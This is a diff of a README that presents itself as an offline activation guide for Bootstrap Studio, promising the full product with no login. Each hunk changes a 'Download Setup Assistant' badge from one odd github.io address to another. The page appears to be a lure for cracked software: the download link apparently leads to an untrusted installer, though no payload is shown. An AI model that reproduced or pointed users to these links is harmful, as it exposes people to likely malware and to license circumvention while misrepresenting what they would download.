@@ -1,6 +1,6 @@
 # Bootstrap Studio — Offline Activation Guide
 
-[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%230072b1?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/Botsrp)
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%230072b1?style=for-the-badge)](https://bootstrap-studio-download.github.io/.github)
 
 > A complete offline setup guide for Bootstrap Studio. Enable full drag-and-drop UI builder, live preview, and export tools with no login required.
 
@@ -37,7 +37,7 @@
 ![Multi-platform Responsive UI](https://th.bing.com/th/id/OIP.u6uCib0nuGFmzWNH5Hy3rQHaEK?rs=1&pid=ImgDetMain&cb=idpwebpc2)  
 *Device preview and export for all screen sizes and platforms*
 
-[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%230072b1?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/Botsrp)
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%230072b1?style=for-the-badge)](https://bootstrap-studio-download.github.io/.github)
 
 ---
 
